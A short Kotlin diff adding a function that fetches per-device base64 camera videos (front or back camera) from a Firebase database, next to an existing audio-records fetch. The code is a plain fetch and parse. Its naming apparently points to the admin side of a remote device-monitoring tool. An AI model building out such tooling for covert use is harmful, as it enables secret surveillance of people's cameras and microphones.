@@ -578,6 +578,58 @@ class FirebaseAdminConnector {
         }
     }
 
+    // Fetch ALL video_records/$token
+    suspend fun getCameraVideos(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
+        val request = Request.Builder()
+            .url("$rootUrl/video_records/$deviceToken.json")
+            .get()
+            .build()
+        try {
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) return@withContext emptyList()
+                val bodyStr = response.body?.string() ?: return@withContext emptyList()
+                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
+                
+                val rootJson = JSONObject(bodyStr)
+                val items = mutableListOf<MediaItem>()
+
+                if (rootJson.has("video") || rootJson.has("base64")) {
+                    val base64 = rootJson.optString("video", rootJson.optString("base64", ""))
+                    if (base64.isNotBlank()) {
+                        val camera = if (rootJson.optBoolean("isFront", false)) "front" else rootJson.optString("camera", "back")
+                        items.add(MediaItem(
+                            id = "root",
+                            base64 = base64,
+                            timestamp = rootJson.optLong("timestamp", 0L),
+                            type = "video",
+                            cameraType = camera
+                        ))
+                    }
+                } else {
+                    val keys = rootJson.keys()
+                    while (keys.hasNext()) {
+                        val key = keys.next()
+                        val obj = rootJson.optJSONObject(key) ?: continue
+                        val base64 = obj.optString("video", obj.optString("base64", ""))
+                        if (base64.isNotBlank()) {
+                            val camera = if (obj.optBoolean("isFront", false)) "front" else obj.optString("camera", "back")
+                            items.add(MediaItem(
+                                id = key,
+                                base64 = base64,
+                                timestamp = obj.optLong("timestamp", 0L),
+                                type = "video",
+                                cameraType = camera
+                            ))
+                        }
+                    }
+                }
+                return@withContext items.sortedByDescending { it.timestamp }
+            }
+        } catch (e: Exception) {
+            return@withContext emptyList()
+        }
+    }
+
     // Fetch ALL audio_records/$token
     suspend fun getAudioRecords(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
